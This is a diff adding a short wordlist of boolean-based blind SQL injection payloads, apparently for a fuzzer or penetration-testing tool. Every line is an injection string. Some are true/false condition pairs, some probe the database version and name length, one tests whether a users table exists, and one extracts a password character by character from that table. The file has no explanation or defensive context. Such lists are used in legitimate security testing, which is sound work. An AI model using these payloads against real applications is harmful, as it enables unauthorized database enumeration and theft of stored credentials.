@@ -1,0 +1,15 @@
+' AND '1'='1
+' AND '1'='2
+' AND 1=1
+' AND 1=2
+' AND 'a'='a
+' AND 'a'='b
+1' AND '1'='1
+1' AND '1'='2
+1 AND 1=1
+1 AND 1=2
+' AND SUBSTRING(@@version,1,1)='5
+' AND SUBSTRING(@@version,1,1)='4
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--
+' AND LENGTH(database())>5--
+' AND EXISTS(SELECT * FROM users)--
